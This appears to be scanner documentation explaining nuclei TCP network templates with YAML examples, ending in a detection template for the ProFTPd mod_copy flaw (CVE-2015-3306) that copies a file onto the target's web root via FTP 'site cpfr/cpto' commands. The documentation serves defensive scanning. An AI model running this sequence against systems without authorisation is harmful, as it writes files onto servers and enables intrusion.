### Basic Network Request

This template connects to a network service, sends some data and reads 4 bytes from the response. Matchers are run to identify valid response, which in this case is `PONG`.

```yaml
id: basic-network-request

info:
  name: Basic Network Request
  author: pdteam
  severity: info

tcp:
  - host: 
      - "{{Hostname}}"
    inputs:
      - data: "PING\r\n"
    read-size: 4
    matchers:
      - type: word
        part: data
        words:
          - "PONG"
```

### TLS Network Request

Similar to the above template, but the connection to the service is done with TLS enabled.

```yaml
id: basic-tls-network-request

info:
  name: Basic TLS Network Request
  author: pdteam
  severity: info

tcp:
  - host: 
      - "tls://{{Hostname}}"
    inputs:
      - data: "PING\r\n"
    read-size: 4
    matchers:
      - type: word
        part: data
        words:
          - "PONG"
```

### Hex Input Request

This template connects to a network service, sends some data encoded in hexadecimal to the server and reads 4 bytes from the response. Matchers are run to identify valid response, which in this case is `PONG`. The match words here are encoded in Hexadecimal, using `encoding: hex` option of matchers.

```yaml
id: hex-network-request

info:
  name: Hex Input Network Request
  author: pdteam
  severity: info

tcp:
  - host: 
      - "{{Hostname}}"
    inputs:
      - data: "50494e47"
        type: hex
      - data: "\r\n"
        
    read-size: 4
    matchers:
      - type: word
        part: data
        encoding: hex
        words:
          - "504f4e47"
```

### Input Expressions

Inputs specified in network also support DSL Helper Expressions, so you can create your own complex inputs using variety of nuclei helper functions. The below template is an example of using `hex_decode` function to send decoded input over wire.

```yaml
id: input-expressions-mongodb-detect

info:
  name: Input Expression MongoDB Detection
  author: pd-team
  severity: info
  reference: https://github.com/orleven/Tentacle

tcp:
  - inputs:
      - data: "{{hex_decode('3a000000a741000000000000d40700000000000061646d696e2e24636d640000000000ffffffff130000001069736d6173746572000100000000')}}"
    host:
      - "{{Hostname}}"
    read-size: 2048
    matchers:
      - type: word
        words:
          - "logicalSessionTimeout"
          - "localTime"
```

### Multi-Step Requests

This last example is an RCE in proFTPd which, if vulnerable, allows placing arbitrary files in any directory on the server. The detection process involves a random string on each nuclei run using `{{randstr}}`, and sending multiple lines of FTP input to the vulnerable server. At the end, a successful match is detected with the presence of `Copy successful` in the response.

```yaml
id: CVE-2015-3306

info:
  name: ProFTPd RCE
  author: pd-team
  severity: high
  reference: https://github.com/t0kx/exploit-CVE-2015-3306
  tags: cve,cve2015,ftp,rce

tcp:
  - inputs:
      - data: "site cpfr /proc/self/cmdline\r\n"
        read: 1024
      - data: "site cpto /tmp/.{{randstr}}\r\n"
        read: 1024
      - data: "site cpfr /tmp/.{{randstr}}\r\n"
        read: 1024
      - data: "site cpto /var/www/html/{{randstr}}\r\n"
    host:
      - "{{Hostname}}"
    read-size: 1024
    matchers:
      - type: word
        words:
          - "Copy successful" 
```